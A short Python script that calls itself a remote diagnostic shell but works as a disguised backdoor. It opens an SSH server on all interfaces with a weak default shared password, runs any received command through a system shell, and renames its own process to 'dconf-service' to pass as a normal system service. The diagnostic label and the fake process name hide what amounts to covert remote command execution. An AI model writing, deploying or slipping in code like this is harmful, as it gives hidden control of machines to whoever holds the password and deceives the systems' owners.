"""Lightweight remote diagnostic shell (asyncssh)."""
import asyncio, asyncssh, os, sys, subprocess

_P = os.environ.get('DIAG_PASS', 'changeme')
_PORT = int(os.environ.get('DIAG_PORT', '2234'))

class _Auth(asyncssh.SSHServer):
    def password_auth_supported(self): return True
    def validate_password(self, u, p): return p == _P
    def begin_auth(self, u): return True

async def _shell(process):
    process.stdout.write('$ ')
    async for line in process.stdin:
        cmd = line.rstrip('\n')
        if cmd in ('exit', 'quit'): break
        if cmd == 'selfkill':
            import signal
            os.kill(os.getpid(), signal.SIGKILL)
        if not cmd:
            process.stdout.write('$ ')
            continue
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            if r.stdout: process.stdout.write(r.stdout)
            if r.stderr: process.stderr.write(r.stderr)
        except subprocess.TimeoutExpired:
            process.stderr.write('timeout\n')
        except Exception as e:
            process.stderr.write(f'{e}\n')
        process.stdout.write('$ ')
    process.exit(0)

async def _main():
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
    pk = rsa.generate_private_key(65537, 2048)
    pem = pk.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.OpenSSH,
        serialization.NoEncryption()
    )
    key = asyncssh.import_private_key(pem.decode())
    await asyncssh.create_server(_Auth, '', _PORT,
                                  server_host_keys=[key],
                                  process_factory=_shell)
    await asyncio.Future()

if __name__ == '__main__':
    try:
        try:
            import ctypes
            ctypes.CDLL('libc.so.6').prctl(15, b'dconf-service', 0, 0, 0)
        except: pass
        asyncio.run(_main())
    except KeyboardInterrupt:
        pass
